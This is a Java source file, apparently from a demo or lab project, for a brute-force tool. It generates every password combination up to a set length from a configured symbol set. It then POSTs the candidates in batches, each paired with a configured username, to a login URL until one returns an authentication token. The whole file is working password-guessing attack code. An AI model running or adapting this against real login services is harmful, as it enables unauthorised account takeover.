package ch.lalumash.hacker.manager;

import ch.lalumash.core.Config;
import ch.lalumash.core.LoginDto;
import ch.lalumash.core.LoginResponseDto;
import lombok.Getter;
import lombok.Setter;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.env.Environment;
import org.springframework.web.client.HttpStatusCodeException;
import org.springframework.web.client.RestTemplate;

import java.util.HashSet;

public class BruteforceManager {
    private HashSet<LoginDto> comb = new HashSet<>();
    private long totalCount = 0;

    public Config getConfig() {
        return config;
    }

    private final Config config;

    @Autowired
    public BruteforceManager(Environment environment) {
        config = new Config();
        config.setUrl(environment.getProperty("bruteforce.url"));
        config.setSymbols(environment.getProperty("bruteforce.symbols"));
        config.setMax(environment.getProperty("bruteforce.max"));
        config.setUser(environment.getProperty("bruteforce.user"));
        config.setDtosPerRequest(environment.getProperty("bruteforce.requests-per"));
    }

    public String bruteforce() {
        totalCount = 0;
        comb = new HashSet<>();

        String res = genAll(this.config.getSymbols().toCharArray(), Integer.parseInt(this.config.getMax()));
        if (res != null) {
            return res;
        }
        if (comb.size() > 0) {
            return send();
        }
        return null;
    }

    String send() {
        String r = sendRequests();
        if (r != null) {
            return r + "; requests sent: " + totalCount;
        }
        comb.clear();
        return null;
    }

    private String sendRequests() {
        try {
            System.out.println("sending request with " + comb.size() + " login data.");
            LoginResponseDto lgu = new RestTemplate().postForObject(this.config.getUrl(), comb, LoginResponseDto.class);
            assert lgu != null;
            return lgu.getToken();
        } catch (HttpStatusCodeException ignored) {
        } catch (Exception exception) {
            exception.printStackTrace();
        }
        return null;
    }

    String genAll(char[] set, int k) {
        for (int i = 1; i <= k; i++) {
            String g = gen(set, i);
            if (g != null) {
                return g;
            }
        }
        return null;
    }

    String gen(char[] set, int k) {
        int n = set.length;
        return printAllKLengthRec(set, "", n, k);
    }

    String printAllKLengthRec(char[] set,
                              String prefix,
                              int n, int k) {
        if (k == 0) {
            comb.add(new LoginDto(this.config.getUser(), prefix));
            totalCount++;
            if (comb.size() >= Integer.parseInt(this.config.getDtosPerRequest())) {
                return send();
            }
            return null;
        }

        for (int i = 0; i < n; ++i) {
            String newPrefix = prefix + set[i];
            String res = printAllKLengthRec(set, newPrefix,
                    n, k - 1);
            if (res != null) {
                return res;
            }
        }
        return null;
    }
}
